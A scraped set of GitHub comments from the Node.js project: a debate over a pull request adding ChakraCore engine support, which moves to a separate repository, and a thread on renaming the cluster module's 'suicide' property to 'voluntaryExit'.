>  The 'project management' behind this PR Has clearly failed. They supposed to wait, fix their issues and start the discussion first. Node.js was supposed to be governed by community. Sadly, this PR shows otherwise.

Don't you think that's a bit dramatic? It's a Pull _Request_ which has led to a discussion. It's not the end of Node.js being governed by its community. I'm not even sure how it's a failure on anybody at Microsoft's part other than the fact that it might be a bad idea to have a Chakra-specific shim in Node.js (for the record - I think it's a bad idea and that a non-Chakra specific ABI would be a better idea).
"
4348	"It's always hilarious when people claim some is bought by Microsoft or they're working against the community, just because their own opinion is not reflected. The community is large and this is a sensitive subject, there are people on both sides and on middle ground.
"
4349	"@hansdunk Here's the discussion. We're in it. Sorry it didn't happen according to the exact timeline that you were expecting. :( Yes, it's still dramatic that you think Node.js community governance is over because one pull request (from a community member) happened before you thought it should.

Here's one of the technical bits that has been discussed here (among others): Do you think that it's a good idea for Node.js to have an ABI/facade for it's Javascript engine or should it be v8 only?

The core technical committee is having a discussion about this PR. Did you read the notes from their last meeting?

All you're doing is flinging accusations about and not really contributing anything at all. Please stop doing that.
"
4350	"Seeing as how not one collaborator has appeared to consider the negatives of this PR, it's understandable that people are a little uncomfortable.

---

@jbergstroem okay, but is there not a CI integration added to Github to be checking PRs automatically where test results can be viewed by the public?
"
4351	"@Qix- have you read the TC meeting notes or the issue and discussion about accepting a second engine? That discussion is held and a lot of people are expressing their opinion - they're just not doing it on the pull request itself. 
"
4352	"Fun self-censorship exercise: swap ""Microsoft"" for ""Google"", and ""Chakra"" for ""v8"". If your sentence is still true then don't bother posting it.
"
4353	"My vote is also to wait for Chakra becoming reliable cross-platform product first, before considering this work.
Meanwhile, it would interesting if <del>Gecko</del> JägerMonkey (Firefox) guys are interested, who happen to have widest/maturest coverage when it comes to cross platforms!
Then there is v7 (https://github.com/cesanta/v7) for embedded systems (known for ""whole JS engine in **one** C file!"" `v7.c`) that will also bring value to the mix due to its unique platform support (imagine your washing machine or fridge running node.js over a lightweight JS engine without v8/Google'ism inside).
"
4354	"We'd like to not have to re-lock this thread but will do so if necessary. Comments from a user who appears to have created a throw-away account simply for the purpose of posting derailing comments here have been removed.

I personally really hate deleting comments and I'm not even going to argue that there aren't legitimate discussion-worthy points being made in the comments being deleted. However, discussion that deviates significantly from technical discussion on this PR and that are intended to continue tangential argumentation will be removed. Please find a new forum for these posts, nobody wants to deny you your opinions, this just isn't the place for them and you're hurting Node.js in general by serving as a distraction from all of the productive things we could otherwise be doing.
"
4355	"@Qix- not yet since I'd have to fork this PR and add commits since it doesn't change vm by default. I opted for opening one of our windows slaves and testing it there instead.
"
4356	"A fork sounds like a much better option IMHO.
On 02-Feb-2016 3:27 am, ""Johan Bergström"" notifications@github.com wrote:

> @Qix- https://github.com/Qix- not yet since I'd have to fork this PR
> and add commits since it doesn't change vm by default. I opted for opening
> one of our windows slaves and testing it there instead.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/node/pull/4765#issuecomment-178214244.
"
4357	"If Node were more open to other engines the auto build process could be configured to automatically produce more builds with different engines. As a totally independent fork would likely stay behind quickly and thus there would be no incentive to use it even. 

As chakra being windows only. If some microprocessor comes out which were to require a modified version of v8 (e.g stripped down etc) I would consider this the same thing. Developers could use node everywhere, but there might be an alternative js engine under the hood which might work better on their platform. Whether they could use native modules is of course not necessarily guaranteed for all platforms. That is sadly already the case anyway.

Actually having chakra or any other engine in node would not be helpful. Fork with automated build seem more logical to me.
"
4358	"@matthiasg The tone I drew from this (and some discussion elsewhere) is that this is yet another attempt to abstract Node from the runtime it uses. [It's not unheard of](http://jxcore.io/), and [it's even being done for Chrome extensions](https://github.com/chromiumify/chromiumify) and [the Java Runtime with Nashorn](https://avatar-js.java.net/). I think it being an option in core (even if it means full `vm` module support is limited to one or more specific platforms) would just further legitimatize these efforts, as well as making future work far easier.
"
4359	"At [yesterday's CTC meeting](https://github.com/nodejs/node/issues/5058), it was resolved to let these changes live in a separate repository under the nodejs/ organization. The rationale behind this decision (or at least my interpretation of it) is that we want to encourage experimentation with this project, yet at this time we don't want to put any additional burden on the collaborators of the main Node.js project to maintain the chakracore version. In particular, issues about the chakracore version should be directed to the new repo (name TBD). Of course, people interested in contributing are more than welcome to do so in the new repo. There is also a @nodejs/chakra team that can be mentioned within the nodejs org.

I suggest that we keep this PR open to continue providing feedback to the actual code changes, which I think would be welcome by the authors. Then instead of merging the changes into this repo, we can push them to the new repo. 

@kunalspathak , can you add two changes to the README:
1. How to build node with chakracore. This can be a part of https://github.com/Microsoft/node/commit/b6e81a220f968859c8c0fb847cf270ca3e173586
2. A visible notice that tells users to file node-chakracore specific issues into the node-chakracore repo rather than nodejs/node. I would keep this as a separate commit.

As usual, please keep the discussion constructive.

cc: @nodejs/ctc 
"
4360	"I would also point out that it's possible that we could include the chakra
builds in CI and regular nightlies.
On Feb 4, 2016 6:25 AM, ""Alexis Campailla"" notifications@github.com wrote:

> At yesterday's CTC meeting https://github.com/nodejs/node/issues/5058,
> it was resolved to let these changes live in a separate repository under
> the nodejs/ organization. The rationale behind this decision (or at least
> my interpretation of it) is that we want to encourage experimentation with
> this project, yet at this time we don't want to put any additional burden
> on the collaborators of the main Node.js project to maintain the chakracore
> version. In particular, issues about the chakracore version should be
> directed to the new repo (name TBD). Of course, people interested in
> contributing are more than welcome to do so in the new repo. There is also
> a @nodejs/chakra https://github.com/orgs/nodejs/teams/chakra team that
> can be mentioned within the nodejs or g.
> 
> I suggest that we keep this PR open to continue providing feedback to the
> actual code changes, which I think would be welcome by the authors. Then
> instead of merging the changes into this repo, we can push them to the new
> repo.
> 
> @kunalspathak https://github.com/kunalspathak , can you add two changes
> to the README:
> 1. How to build node with chakracore. This can be a part of Microsoft@
>    b6e81a2
>    https://github.com/Microsoft/node/commit/b6e81a220f968859c8c0fb847cf270ca3e173586
> 2. A visible notice that tells users to file node-chakracore specific
>    issues into the node-chakracore repo rather than nodejs/node. I would keep
>    this as a separate commit.
> 
> As usual, please keep the discussion constructive.
> 
> cc: @nodejs/ctc https://github.com/orgs/nodejs/teams/ctc
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/node/pull/4765#issuecomment-179868492.
"
4361	"> it was resolved to let these changes live in a separate repository under the nodejs/ organization

Will that repo also adhere to our Node.js CoC, Contribution, Moderation and other procedures we follow?
"
4362	"Yes, it would fall under the same policies as the main repo. I imagine a
chakra team would be created and eventually a WG would emerge.
On Feb 4, 2016 6:44 AM, ""thefourtheye"" notifications@github.com wrote:

> it was resolved to let these changes live in a separate repository under
> the nodejs/ organization
> 
> Will that repo also adhere to our Node.js CoC, Contribution, Moderation
> and other procedures we follow?
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/node/pull/4765#issuecomment-179876943.
"
4363	"+1 for a WG to be formed around this, and keeping the policies in line with the main repo as much as possible. In the interest of relieving Node's collaborators from additional duties, we might want to make some slight modifications to the [collaborator guide](https://github.com/nodejs/node/blob/master/COLLABORATOR_GUIDE.md) to replace ""collaborators"" with ""WG members"".
"
4364	"> Forming a WG

For organizational purposes this may make sense but there's one thing that troubles me about it. The goal of the WG will be to get this eventually merged into Core, if contentious issues come up in that repo it would be best to escalate those to the CTC, not just to the WG membership. This would avoid decisions that are controversial being made in that repo that will make it difficult to eventually merge the work into core.
"
4365	"Agreed. Couldn't that be put into the WG charter tho? :-)

On Thu, Feb 4, 2016 at 10:48 AM, Mikeal Rogers notifications@github.com
wrote:

> Forming a WG
> 
> For organizational purposes this may make sense but there's one thing that
> troubles me about it. The goal of the WG will be to get this eventually
> merged into Core, if contentious issues come up in that repo it would be
> best to escalate those to the CTC, not just to the WG membership. This
> would avoid decisions that are controversial being made in that repo that
> will make it difficult to eventually merge the work into core.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/node/pull/4765#issuecomment-179996817.
"
4366	"Agreed. I was suggesting that we replace `collaborators` with `WG members` but still allow for CTC escalation for controversial issues. We should probably also promote some level diversity in the WG membership so that controversy can be had :smile: 
"
4367	"I'd also suggest that changes in the repo be limited to only those directly impacting the implementation of the chakra support. Anything that can be upstreamed into the main repo should be.
"
4368	"> The rationale behind this decision (or at least my interpretation of it) is that we want to encourage experimentation with this project, yet at this time we don't want to put any additional burden on the collaborators of the main Node.js project to maintain the chakracore version.

---

> I would also point out that it's possible that we could include the chakra builds in CI and regular nightlies.

Perfect. This is what should be happening. Happy this is how it turned out :+1:
"
4369	"Is it just me, or till ChakraCore is not ported to all the platforms supported by V8, all this stuff is completely useless?

I can't see how you could release a ChakraCore version of Node that works only on Windows, it would mean an hell of fragmentation...
"
4370	"Update: we are in the process of transferring https://github.com/microsoft/node to nodejs/node-chakracore. Once that's done, I'll create an issue in that repo inviting collaborators to a newly formed node-chakracore WG, which will act as the repo collaborators. 

In the meantime, if reviewers of this PR are comfortable giving it a 'LGTM as a starting point for the new repo', we can make the changes of this PR the head of the `chakracore-master` branch. Otherwise, we can resume the review process in the new repo.
"
4371	"> LGTM as a starting point for the new repo

I think I would be a little confident if we had a green CI run.
"
4372	"@thefourtheye assuming you mean on the regular CI, which doesn't test the chakracore build. Green status on the chakracore build is still work in progress.

https://ci.nodejs.org/job/node-test-pull-request/1606/ shows a merge conflict. @kunalspathak can you rebase the PR onto the current master?
"
4373	"BTW, I don't think a straightforward ""repo transfer"" will work in GitHub because that repo is in the same fork network as one already in this repo. That means you'll have to essentially pull down the repo and all branches and push it to a brand new repo in this org. It's annoying, and you'll lose the issues, but I don't know of a way around it.
"
4374	"@mikeal, thanks for the suggestion. We were actually able to work around it but removing the fork link first (had to contact GH support for it).
"
4375	"@orangemocha awesome! good to know that is an option, this will probably come in useful again in the future :)
"
4376	"On second thought, rebasing here is not necessary, as we can push to the new repo the master that this PR is up-to-date with, and deal with the conflict in the next master -> chakracore-master integration.

Here's a CI run with no rebasing: https://ci.nodejs.org/job/node-test-commit/2175/. It shows 2 failures on ARM (linux). Investigating whether these could be legit or flaky. /cc @nodejs/testing 
"
4377	"@orangemocha Those are both known flaky tests that are marked as flaky in current master. One of them has a fix ready to go in a PR that might land in another day or three. The other one is probably Flaky Test Public Enemy Number One once that PR lands.
"
4378	"Thanks for clarifying that @Trott ! I guess that means that the CI run looks good for this PR.
"
4379	"@orangemocha Yes. The TL;DR of my comment is: Those are known flaky tests. The CI run looks good.
"
4380	"> The CI run looks good.

Can someone sign off on this PR then, so we can go ahead and move the repo?

// cc: @thefourtheye, @silverwind, @jepler, @Fishrock123, @benjamingr , @TooTallNate, @jasnell
"
4381	"@orangemocha I think we're good to go and you should have the right access level to pull it off.

I'd like to suggest a couple of things:
1. Keep it in sync with nodejs/node as much as possible so it can be compared at any time by anyone who adds it as a remote to their local clone. Either keep this PR open with the changes (which I think you were suggesting) or keep an equivalent PR open there with the changes. The aim is to get it to a point where we can actually make a decision about merging it or not rather than pursuing it as a separate project indefinitely (at least that's the aim right now).
2. Place a notice at the top of the README on the default branch of the new repo that clearly states that it is a work in progress, not an officially endorsed branch of Node.js and maybe link back to this issue. We need to follow a process that doesn't presume that decisions have been made that have actually not, so far all that the CTC has offered is a way to make progress and I imagine we'd get a lot of upset people commenting if it looked like we'd already pulled the trigger on this.
"
4382	"Thanks for the suggestions, @rvagg.
1. Yep, I had a chat with @kunalspathak and the current plan is to have a master branch which is the same as nodejs/node:master and a chakracore-master branch that would be master + the chakracore changes, so the diff would be easily visible, and to keep syncing master from nodejs/node and integrating changes into chakracore-master, ~weekly. Let me know if you have any additional input.
2. Will do.
"
4383	"Sorry to bikeshed, but I'm still not totally happy with the name of `process.jsEngine`. I'd rather have it be `process.engine` for simplicity and it's more neutral towards the `es` vs `js` naming debacle.
"
4384	"@silverwind :+1:, but more so for API consistency than that particular reason. Most of the other Node APIs use that convention. It's `version`, not `nodeVersion`, for example. Trying not to derail the topic, though.
"
4385	"I am on the opposite camp, I think that `engine` could be ambiguous. There could be different types of engines in this thing (e.g. libuv could be seen as the I/O engine). 

Anyway, since the new repo is already live, at this point I think it would be better to open an issue in the new repo and discuss it there. I will follow up.

EDIT: opened issue https://github.com/nodejs/node-chakracore/issues/19
"
4386	"And here is node-chakracore: https://github.com/nodejs/node-chakracore ! Hoping to get lots of contributions :smile: 
"
4387	"As @orangemocha mentioned these changes are ported to new repo https://github.com/nodejs/node-chakracore `chakracore-master` branch. Weekly merge from nodejs.node `master` and chakrashim changes will happen in this branch of new repo. Feel free to contribute and providing feedback. Thanks everyone for the support!
"
4388	"@orangemocha Does this still need `ctc-agenda`?
"
4389	"Removed ctc-agenda. We'll ping the CTC periodically to provide updates and get feedback on the direction of the project. Thank you.
"
4390	"Abstracting Node from the underlying engine sounds good, but we should avoid incompatibilities, otherwise we may start to see packages only working for a specific engine that will not be reusable in the other, so here comes the **potential fragmentation**.
Please, let's not bring cross-platform headache to Node, make the differences minimal, defining a clear and common API, that's all I would ask.
Great job btw.
"
4391	"@mjolnic I agree, but I will note that Browserify/Webpack isn't helping that too much. I do feel that NAN might help alleviate much of that concern, though, but it'll have to go through a major version change to account for all the additional abstraction boilerplate it'll need.

I'm also staring intently on WebAssembly, which will also be runnable on future versions of Node, with Chakra and V8 both supporting it, and that may have an even more significant impact on native addons (more than even supporting Chakra IMHO, because of the language difference).
"
4392	"From Node's POV WebAssembly will look like an opaque blob of JS. You can call into it from JS, it can call out to JS, but the API surface is the same as an opaque JS blob.

Eventually WebAssembly may gain access to extra APIs, but the MVP won't have anything special. If / when WebAssembly gains new APIs I think they should be designed with Node in mind, not just browsers.
"
4393	"Just echoing @davidmurdoch,

What are the benefits of adding this? this question is specially important when you consider the complexity that is introduced not only to the core of node.js but also the code that will be written against node, having to worry about the version of node.js is enough, don't need to compound that into a matrix of backends and versions.

@kunalspathak Can you please give some context?"
4394	"Where does it say we shouldn't use it? In the same vein, one could say `kill` is bad, which is an universally used term in the Unix world.
"
4395	"I'm :+1: on replacing problematic terminology gradually, with aliases. For the `kill` and `suicide` terms, it seems to me like `stop` and `stopped` actually makes more sense, especially across language barriers. The `master` and `worker` terminology could also be `parent` and `child`, which seems a bit friendlier.

Sadly, the whole unix process model is overridden with terminology related to violence and slavery... :disappointed: 
"
4396	"Don't forget the sexual overtones: mount, touch, finger...  Back on topic, we can't remove the `.suicide` property because of backwards compatibility.  I'm -1 on aliasing it, that's just more surface area for bugs and confusion.
"
4397	"I'm -1 on `kill` because it's documented that way in syscalls so this would add a lot of confusion, same for anything else that is documented as such far below the node.js layer. `suicide` is purely part of our own abstraction and should be changed. This goes back to the `Node.js is fun` principal: seeing suicide in my code bums me out and is decidedly not fun.
"
4398	"Yeah IMHO I'm not seeing the benefit of changing the wording here when there would be backwards incompatibility. The word is short and to the point. As @silverwind mentioned, this is a slippery slope and in general, deviating from traditional UNIX/industry word usage (e.g. renaming `kill` to `stop`) is likely to just cause more confusion.

I'm -1 as well.
"
4399	"Can you re-scope this to _just_ be about suicide rather than opening up the potentially endless bikeshed about every verb in the code base?
"
4400	"-1 for aliasing unless the reason for doing that is very serious.

That term `suicide` there is not directed onto someone, and without that, words are just words. You can see that word in any dictionary, in Wikipedia, in some book, etc. — it doesn't make the dictionary, Wikipedia, or the book bad.

Also, It's already there, non broken, and is purposely exposed. It's also not a security nor a bugfix. That would make deprecation a `semver-major` change, I guess. And I doubt that it will go away in the forseeable future.
"
4401	"> Yeah IMHO I'm not seeing the benefit of changing the wording here when there would be backwards incompatibility. 

The whole point is that we can do this in a reverse compatible way without breaking any code, so this is just not true.

I think that this verb is particularly meaningful in that a member of our community killed himself not that long ago and those of us that were close to him would rather not be reminded of it every time we use this API.
"
4402	"Going back and changing everything that is potentially unfortunate or problematic is likely not worth the effort. The comment I made that kicked this conversation off in the first place was due to my forgetting that `suicide` was already a term in use in the code. I'd rather not _add_ to the problem by introducing new stuff. However, if we we have the opportunity to make improvements as we go, then we should likely do so, but we shouldn't bikeshed on it too much or try to solve everything all at once.
"
4403	"> Yeah IMHO I'm not seeing the benefit of changing the wording here when there would be backwards incompatibility.

At some point it would be removed though and if other parts of our API have been any indication, not everyone updates their code for things like this and sometimes we end up being ""stuck"" with past decisions.

> I think that this verb is particularly meaningful in that a member of our community killed himself not that long ago and those of us that were close to him would rather not be reminded of it every time we use this API.

While that is tragic, to me it's important to separate technical, personal, historical, etc. contexts here and the suicide term as we use it in node.js is used in a purely technical context. I'd be much more open to changing the wording if for example the word was not an accurate description of what it was representing.

Also, as I said, changing this one particular instance leads to a slippery slope because then we would have to evaluate the entire code base and somehow objectively determine the ""offensiveness"" of each word we use because of the large diversity of negative things that exist in the world. For example, what about a female coder that had an abortion and has an issue calling sub-processes, ""child processes"" because the world ""child"" reminds her of her abortion and to add insult to injury, node's built-in module is also called `child_process`, requiring her to see the word every time she goes to start a subprocess? What about `child.kill()`? What about `process.kill()`? The list goes on...

Deviating from existing technical terms used throughout common computing platforms and the computing industry in general because a separation of contexts cannot be made on an individual level will IMHO cause more problems that will outweigh any benefit that may come of it.

That's my 2 cents.
"
4404	"@mscdex There's a big gap between potentially offensive verbs we are using, and will in all likelihood continue to use, because they are adopted from the layer below us (like `kill`) and those that we are adopting in APIs that are entirely Node.js. In this case, we actually own this abstraction, we are not _perpetuating_ the use of a common term, in the case of `suicide` we've actually **chosen** it for an API. This term isn't even common, I've never seen it anywhere else, a quick google for ""suicide API"" found no technical pages and a lot of depressing real stories, so I'm not seeing the case for persisting this verb when it's easily in our ability to move past it without negatively impacting users. You're making a good case for several other verbs, just not this one.
"
4405	"> At some point it would be removed though

Only if nobody is using it anymore, the cost of keeping the compatibility code there is basically zero.
"
4406	"> the cost of keeping the compatibility code there is basically zero.

There is no such thing as zero cost code.
"
4407	"""basically zero"" == ""as close to zero as a few lines of code can get, but definitely not literally zero"" :)
"
4408	"Possible options: http://www.thesaurus.com/browse/terminate
"
4409	"I'm personally for [`adjourn`](http://www.thesaurus.com/browse/adjourn).
"
4410	"What if you change the word but not the people thoughts?
"
4411	"I'm -1 for making the change at all. However, if a change is made, I'd like to use a term like `voluntary` or `intentional` (as opposed to just a synonym for suicide) to show that the process was intentionally killed.
"
4412	"Not a contributor, but -1 as a node user. This renaming potentially offensive terms is getting out of hand in the open source community. These unix terms have been around for years and they are fine. Who is even getting offended? 
"
4413	"> These unix terms have been around for years and they are fine.

Can someone show me where suicide is a commonly used unix term? I can't find any evidence of this yet it is continually asserted as being true.
"
4414	"+1 for replacing. How about `voluntaryExit` since the docs state that it is set when the worker voluntarily exists
"
4415	"While I agree with `kill` being a universal unix term, `suicide` is worthy of a change. I've never seen anything in unix using that term.
"
4416	"I support changing it. There is no downside to changing it. Mental health is a very real issue for many people and small notions can make a difference. People commenting about ""who is getting offended"" please ask yourself why you are spending energy arguing in this thread?
"
4417	"± for replacing. If we do replace, suggested replacement: `seppuku`
"
4418	"+1 for replacing. Asking for people to step up and say ""I am the one getting offended by this,"" with a tacit, unstated _""so we can talk you out of it""_, is not productive. If it's being broached here the person broaching it probably has a good reason in mind, and it's a sensitive topic so they may not want to share it. 

If you don't personally have negative connotations with that word — if it's just another verb to you — that's totally fine and OK; but it means _a lot_ to others, and we should be mindful of that. We lose _nothing_ in changing it (a semver major, maybe, which we've long since figured out how to pull off in a repeatable fashion), and make other folks lives slightly easier. Isn't that what OSS is supposed to be all about?
"
4419	":100: on the change. i like suggestions that involve including whether it is voluntary or not, as well.

understood that it needs to be an alias for now for backwards compatibility, but let's mention in the docs that the terms are `deprecated` so there's a projected road-map for eventually eliminating them. (happy to help with this communication/documentation)

also, i'd like to say that the people who have taken this thread as an opportunity to make jokes should take a serious look at their motivations for doing so. does the suggestion that this change be made make you uncomfortable? this is not a joke, and is a worthy issue. i don't believe those comments have a place here.
"
4420	"+1 for the change, with alias to avoid breaking backwards compat.
"
4421	"I like `voluntaryExit`. It's more descriptive, and also not callous like the current term is. Terming anything `suicide` is quite frankly disgusting.

Being welcoming (and understandable) in the words our code uses can only do good in growing the node community. We can keep aliases when necessary, though our release process should better enable the deprecation of older APIs over time.
"
4422	"+1 from me to change it. There are far more important things to be doing instead of bikeshedding words. If a term makes someone uncomfortable and can be easily aliased I don't see the issue with doing so to make the codebase more accessible. Nobody is losing anything here.
"
4423	"+1 for change but backwards compatible friendly.  +1 for voluntaryExit .
"
4424	"Scoping: this issue is only about `suicide` and not about other terms in the node codebase or other open source projects.
Question: What is a suitable replacement word?
Proposal: deprecate `suicide` and alias with another term, such as `terminated`
Cost: minimal. it's an internal messaging abstraction in the `cluster` module
Benefit: promotes an inclusive node community, demonstrates sensitivity, and recognizes that people matter more than code

To my :eyes:, this is an easy decision
"
4425	":100: for the change. And as far as people being offended, well put me in that group if you really need to lump someone in. Stuff like this is a constant battle for me and seeing words used in APIs is triggering and makes me reticent to get involved. 

""That's how we've always done it."" isn't a good argument for not fixing broken language. I like the idea of aliasing in node the `kill`, `master`, `worker`, `slave` terminology until Unix can do it at that level. 

+1 for `voluntaryExit`
"
4426	"really glad to see support pouring in. I'm doing a first pass at this right now with voluntaryExit being used.
"
4427	"+1 for `voluntaryExit`. The term ""suicide"" doesn't even make that configuration option very clear. This one is much more clear.
"
4428	"<3<3<3 @TheAlphaNerd thanks for kicking this off.
"
4429	"+1 for `voluntaryExit` or similar. This directly affects me. Saw messages in my mailbox last night about 'suicide' and that was distinctly unpleasant as that is a thing that happens in my community _weekly_ and often requires I drop what I'm doing and help someone out.
"
4430	"Programming node can be really fun for me. As somebody who has attempted suicide, seeing `suicide` come up in code occasionally takes away that fun and brings back some painful memories. Sometimes such language is unavoidable (like historical) or has changed due to context and can't be avoided. This looks like an abstraction exclusive to node according to @mikeal, so a name change to `voluntaryExit` with a backwards compatible alias seems great.

Thanks to @TheAlphaNerd for bringing this up.
"
4431	":100: to making the narrowly scoped change.

It’s never a bad thing to push a change and think to yourself, _Now there is at least one person whose life will be a little less painful_. Sometimes we do that with a fancy algorithm that speeds a task up, sometimes we do that with a cleaner UI that makes a task a little easier, and this is a place where we can accomplish that honorable goal by changing a single word.
"
4432	"+1 for `voluntaryExit`.

> ± for replacing. If we do replace, suggested replacement: seppuku

This is not helpful, @rennat. This is a serious issue that deserves to be treated with thoughtful consideration and respect.
"
4433	"I already made my opinion on this issue [known on Twitter](https://twitter.com/othiym23/status/664152632102023168), but I'm strongly +1 for making a backwards-compatible change to a less loaded term like `voluntaryExit`, with a clear deprecation strategy in place, as @ashleygwilliams and @chrisdickinson suggest. There are many members of the Node community who have been directly affected by suicide, which makes the level of callousness displayed at the start of this thread especially disgusting. Big thanks to @TheAlphaNerd for bringing this up.
"
4434	"Furthermore, I'd like to +1 the idea of sanctioning individuals who feel the need to contribute disruptive/harmful comments to this thread.
"
4435	"As someone who's lost many family and friends to suicide, I'll put myself out there as someone who's offended.
"
4436	"https://github.com/nodejs/node/pull/3743
"
4437	"I am not against any of the naming changes regarding words like suicide, master and slave. I am just curious as to why these are deemed so important to change. Obviously these terms are like any other subjective to the context in which they are used. I.e. You could say that killing a person is wrong, but how would that apply to killing a process?
"
4438	"+1 for changing the name of this API.

The ""suicide"" API name is not based on any long-standing Unix-ism.  (And yes, I of course know that many of those are rather problematic, but here we are.)  In this case, it was a ""cute"" choice to indicate that the process terminated normally, rather than receiving a fatal signal from the parent.  Anyone claiming otherwise, citation needed.

As @bnoordhuis points out, there is a non-zero cost of every line of code.  There is also a non-zero cost to using offensive terminology in code.  It is clear to me which cost is higher here.

Compatibility layer prevents any backwards-compatibility breakage.  This lowers the cost of change even further.

**I am the one getting offended by this.**  See the other comments pop in, I'm not alone.  I'm happy to share the details of exactly _why_ this is offensive to me, and I'm sure anyone with an ounce of humanity will see exactly why there is no way that I'll ever _not_ be offended by this, but it's a very tragic and triggering story that does not need to be left here as an emotional land-mine to anyone who might be reading this thread.  Ask offline if you care to know.

Thank you, @TheAlphaNerd for bringing this up.  I don't understand why this is even controversial.
"
4439	"i think @emilyrose makes a good point here. people need to be held accountable. jokes on this thread certainly violate the [nodejs code of conduct](https://github.com/nodejs/node/blob/master/CONTRIBUTING.md#code-of-conduct) AND [npm code of conduct](https://www.npmjs.com/policies/conduct) (included because it is clearer about enforcement)
"
4440	"+1 to show my support for replacing suicide with `voluntaryExit` and having a clear deprecation strategy as has already been stated by many.

+1 to support @emilyrose and @ashleygwilliams with the need for the code of conduct to be upheld.
"
4441	"Another +1 to this change.

Like many have said before me: the change is adding an alias, which is backwards compatible. The change has an incredibly small cost, which is easily handled by semver. This is not changing already baked in Unix terminology (which is a totally different conversation) but something specific to node, and it provides an immense benefit in being more inclusive to the community as a whole.

If you are somebody who is not offended (or affected at all) by the current terminology, why would you even care about this, better yet in a way that makes expending your energy here worthwhile?
"
4442	"Thinking about possible new terms but want to clarify. The docs say ""The boolean worker.suicide lets you distinguish between voluntary and accidental exit"". So are ""voluntary exit"" and ""accidental exit"" two different statuses and if so, would naming it voluntaryExit be the right term?
"
4443	"Another (less emotional, purely pedantic) argument in favor of the change: `suicide` is being used as a boolean state, and in english it's either a noun or a verb, but not an adjective.  It's a confusing API at best, and changing it would be an improvement even for those who are not reminded of unsettling tragedies.
"
4444	"It is unfortunate that the verb ""to stop"" is ambitransitive in English. In Japanese for example, there is the transitive 止める (tomeru, to stop something) and the intransitive 止まる (tomaru, to stop oneself (this is not exactly true, but would fit here I think)). There would be a distinction which would naturally solve this problem.
"
4445	" I'd suggest `selfDestruct`.
"
4446	"I think `voluntaryExit` is the right choice since that is what it is supposed to be a boolean for. `selfDestruct` carries a lot of similar mental health connotations to `suicide`. Many folks dealing with these issues are often engaging in self destructive or self harm behavior before reaching a point of suicide. 
"
4447	"+1 on `voluntaryExit`

Also, I want to echo what @emilyrose and @ashleygwilliams have said. Some of the conversation in here most certainly does violate the code of conduct, and this is absolutely unacceptable.

We can talk about how effective or not various CoCs are for creating safe, welcoming spaces, but at the end of the day, it doesn't matter _how_ good the CoC is if it's not enforced. An unenforced CoC is _worse_ than no CoC at all.
"
4448	"+1 `voluntaryExit`

mental health issues shouldn't be taken lightly
"
4449	"+1 `voluntaryExit` makes sense. It's a property. This is more descriptive than `suicide` (which is at best strange wording). 
"
4450	"Yes github should be a safe space for all those involved. I'm going to change my view to +1. It doesn't hurt anything.
"
4451	"+1 on `voluntaryExit`, but it still doesn't sound boolean. Perhaps `voluntarilyExited` if that's important (the original didn't sound boolean either, so it may not be).
"
4452	"Let's keep things calm on all sides of the discussion. The majority of folks who have weighed in appear to be in favor of making the change and deprecated the previous term so that's likely what should happen. For the folks who feel that the change shouldn't be made, please just keep in mind that it doesn't hurt any to be sensitive and existing code should not break with appropriate aliasing/deprecation. 
"
4453	":+1: for `voluntaryExit`. it both removes the emotional impact on those affected by suicide and is more clear and descriptive of what actually happened from a technical standpoint.
"
4454	"At this point I think we have a very wide variety of opinions and a PR #3743 is already in.

I'd like to suggest locking the thread
"
4455	"+1 to locking, @TheAlphaNerd 
"
4456	"+1 to locking as well @TheAlphaNerd 
"
4457	"I think it is never a bad idea to remove offensive words from the API.

Ideally it would be great if we could catch such naming mistakes earlier, before they will go into release. Is there anyone who could volunteer for this? Maybe we should have a WG for this?
"
4458	"Oh, @isaacs, you locked it just when I posted a question.
"
4459	"@indutny perhaps we should start a thread about this in @nodejs/diversity?
"
4460	"@TheAlphaNerd makes sense!
"
4461	"@indutny I doubt that this verb would have made it past the review process we have in place already. This API was added when things were very different and I don't think we're at risk of adding _new_ APIs that lack this sensitivity.
"
4462	"@indutny @TheAlphaNerd https://github.com/nodejs/diversity/issues/9

@mikeal feel free to point to those review processes if you think they're adequate moving forward.
"
4463	"@isaacs improvements to the existing cluster API triggered a review which lead to this issue in the first place, so #3720 would be an example :)
"
4464	"I'll just say that, as someone who has merged a few PRs to node before, I was not instructed on any sort of terminology review process when invited to be a collaborator. Not sure what the experience was like for later rounds of new collaborators.
"
4465	"Well, as the person who raised the initial concern (https://github.com/nodejs/node/pull/3720#issuecomment-155181135) I'm happy to see this being addressed. I don't think we need any kind of formal process around this but as a best practice we should, in general, try to be incrementally better at this kind of stuff.
"
4466	"@jasnell you wrote the dev policy and the contributing docs, is there an obvious place to note something like this in the contribution guidelines?
"
4467	"> I'll just say that, as someone who has merged a few PRs to node before, I was not instructed on any sort of terminology review process when invited to be a collaborator. Not sure what the experience was like for later rounds of new collaborators

It's a little better now, but not that specific.

See: https://github.com/nodejs/node/pull/3726/files#diff-c00e7ffdc40896f8ff6567c07f9eb43cR15 (And other spots), but it could be better and clearer still. Keep in mind this is only a rough draft me and @chrisdickinson have been working off of. We need a place for high-level project values, including this one.
"
4468	"Ah, cool. That looks like a big improvement from where I came in. :smile: 

I definitely would like to see a `core-values.md` or something like that too.
"
4469	"@mikeal ... I can take a look. One thing to note, however, is that while we have documented practices for _contributing_ we don't actually have documented practices for _reviewing_ those contributions. What are the things to look out for? What are the best practices for mentoring new collaborators? @Fishrock123 recently just started working on onboarding docs (https://github.com/nodejs/node/pull/3726), perhaps that would be the best place to cover this?
"
4470	"@jasnell I think that the process for _reviewing_ is essentially making sure the contribution passes our contributing guidelines. TBH, these documents are so large it's not reasonable to expect every contributor to understand every inch of them, that's why we have a review culture that brings PRs inline with the contribution policy and through the review process is how most people learn the guidelines.
"
4471	"@mikeal ... yep, we should work on simplifying them. However, much of this can be helped by setting clear expectations during the on-boarding process and by encouraging the existing base of collaborators to lead by example.
"
